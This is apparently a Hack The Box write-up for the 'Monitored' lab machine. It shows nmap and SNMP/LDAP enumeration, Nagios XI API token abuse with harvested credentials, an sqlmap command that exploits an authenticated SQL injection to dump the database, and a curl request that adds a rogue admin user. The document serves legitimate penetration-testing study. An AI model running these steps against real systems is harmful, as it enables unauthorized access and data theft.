---
title: "Monitored"
date: 2025-01-20
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "htb walkthrough", "hackthebox", "monitored", "writeup"]
---

# Monitored

# Monitored
OS: Linux
Difficulty: Medium

## Credentials
```text
root@monitored.htb
svc : XjH7VCehowpR1xZB
```

# Enumeration
# Nmap
TCP
```sh
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0
| SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| BQAwgY0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZEb3JzZXQxFDASBgNVBAcMC0Jv
| dXJuZW1vdXRoMRIwEAYDVQQKDAlNb25pdG9yZWQxHTAbBgNVBAMMFG5hZ2lvcy5t
| b25pdG9yZWQuaHRiMSQwIgYJKoZIhvcNAQkBFhVzdXBwb3J0QG1vbml0b3JlZC5o
| dGIwIBcNMjMxMTExMjE0NjU1WhgPMjI5NzA4MjUyMTQ2NTVaMIGNMQswCQYDVQQG
| EwJVSzEPMA0GA1UECAwGRG9yc2V0MRQwEgYDVQQHDAtCb3VybmVtb3V0aDESMBAG
| A1UECgwJTW9uaXRvcmVkMR0wGwYDVQQDDBRuYWdpb3MubW9uaXRvcmVkLmh0YjEk
| MCIGCSqGSIb3DQEJARYVc3VwcG9ydEBtb25pdG9yZWQuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qRRCKn9wFGquYFdqh7cp4WSTPnKdAwkycqk
| a3WTY0yOubucGmA3jAVdPuSJ0Vp0HOhkbAdo08JVzpvPX7Lh8mIEDRSX39FDYClP
| vQIAldCuWGkZ3QWukRg9a7dK++KL79Iz+XbIAR/XLT9ANoMi8/1GP2BKHvd7uJq7
| LV0xrjtMD6emwDTKFOk5fXaqOeODgnFJyyXQYZrxQQeSATl7cLc1AbX3/6XBsBH7
| e3xWVRMaRxBTwbJ/mZ3BicIGpxGGZnrckdQ8Zv+LRiwvRl1jpEnEeFjazwYWrcH+
| 6BaOvmh4lFPBi3f/f/z5VboRKP0JB0r6I3NM6Zsh8V/Inh4fxQIDAQABo1MwUTAd
| BgNVHQ4EFgQU6VSiElsGw+kqXUryTaN4Wp+a4VswHwYDVR0jBBgwFoAU6VSiElsG
| w+kqXUryTaN4Wp+a4VswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAdPGDylezaB8d/u2ufsA6hinUXF61RkqcKGFjCO+j3VrrYWdM2wHF83WMQjLF
| 03tSek952fObiU2W3vKfA/lvFRfBbgNhYEL0dMVVM95cI46fNTbignCj2yhScjIz
| W9oeghcR44tkU4sRd4Ot9L/KXef35pUkeFCmQ2Xm74/5aIfrUzMnzvazyi661Q97
| mRGL52qMScpl8BCBZkdmx1SfcVgn6qHHZpy+EJ2yfJtQixOgMz3I+hZYkPFjMsgf
| k9w6Z6wmlalRLv3tuPqv8X3o+fWFSDASlf2uMFh1MIje5S/jp3k+nFhemzcsd/al
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.56 (Debian)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped syn-ack ttl 63
```

UDP
```sh
PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open          ntp          NTP v4 (unsynchronized)
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp   open          snmp         net-snmp; net-snmp SNMPv3 server
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
Service Info: Host: monitored
```
# HTTP
https://nagios.monitored.htb/
![screenshot](/assets/images/monitored1.png)

https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
![screenshot](/assets/images/monitored2.png)

https://nagios.monitored.htb/nagiosxi/about/
![screenshot](/assets/images/monitored3.png)

Default password `root : nagiosxi` didn't work. 

## Fuzzing





# SNMP
```sh
# brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.248
```

![screenshot](/assets/images/monitored4.png)

```sh
# enumerate SNMP
snmpwalk -c public -v1 -t 10 10.10.11.248 > snmp
```

![screenshot](/assets/images/monitored5.png)

```text
svc : XjH7VCehowpR1xZB
shellinabox
```

# LDAP
```sh
ldapsearch -x -H ldap://10.10.11.248 -D '' -w '' -b "DC=monitored,DC=htb"

ldapsearch -x -H ldap://<IP> -D 'monitored.htb\svc' -w 'XjH7VCehowpR1xZB' -b "DC=monitored,DC=htb"
```

![screenshot](/assets/images/monitored6.png)

# API
Researching Nagios , we find [this post](https://support.nagios.com/forum/viewtopic.php?p=310411#p310411) on the Nagios forums that provides us with the following command, utilising the service's API:
```sh
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d
'username=nagiosadmin&password=YOURPASS&valid_min=5'

# modified command using the found credentials
curl -X POST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d
'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```

![screenshot](/assets/images/monitored7.png)

```json
{"username":"svc",
"user_id":"2",
"auth_token":"0182c02b56faee56f0c0a9e8bef83ba014f77952",
"valid_min":5,
"valid_until":"Tue, 15 Apr 2025 16:42:05 -0400"
```

We obtain an authentication token for svc . The next command in the post shows us how this token can be
used:
```sh
# original
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?
createimage&host=localhost&token=TOKEN' > image.png

# modified
curl -k -L 'http://nagios.monitored.htb/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=0182c02b56faee56f0c0a9e8bef83ba014f77952"' > image.png
```


![screenshot](/assets/images/monitored8.png)

```sh
# API key
36aae36751d9360334d344874908ff4ad14111bf
```

![screenshot](/assets/images/monitored9.png)


![screenshot](/assets/images/monitored10.png)

https://nagios.monitored.htb/nagios/
![screenshot](/assets/images/monitored11.png)

![screenshot](/assets/images/monitored12.png)

# Foothold
## SQLi
https://0xhackerfren.gitbook.io/0x_hackerfren/hack-the-box/hack-the-box/boxes/medium/linux/monitored#post-authentication-sqli-in-nagios-xi

https://www.rapid7.com/db/modules/exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo/

https://nvd.nist.gov/vuln/detail/CVE-2023-40931

```sh
curl -X POST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
```

Now We can abuse the authenticated SQLI injection found at `/nagiosxi/admin/banner_message-ajaxhelper.php` in the ID parameter. 

Pass the token we got into the URL query along with an ID. Start the enumeration with `-dbs` to find the databases. Then use `-D nagiosxi` to set the database and `--dump` to dump the data.

```sh
sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=598a786f19ceeb4b6af66c85ab32ca171848aebf" --level 5 --risk 3 -p id --batch -D nagiosxi --dump
```

You can find the dumped data at the location output by SQLmap, in my case `/home/kali/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/`

```sh
curl -X POST --insecure "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=hackerfren&password=Kekistan&name=hackerfren&email=hackerfren@localhost&auth_level=admin"
{
    "success": "User account hackerfren was added successfully!",
    "user_id": 6
}
```
## Create a custom reverse shell

![screenshot](/assets/images/monitored13.png)


# Privilege Escalation
## Enumeration


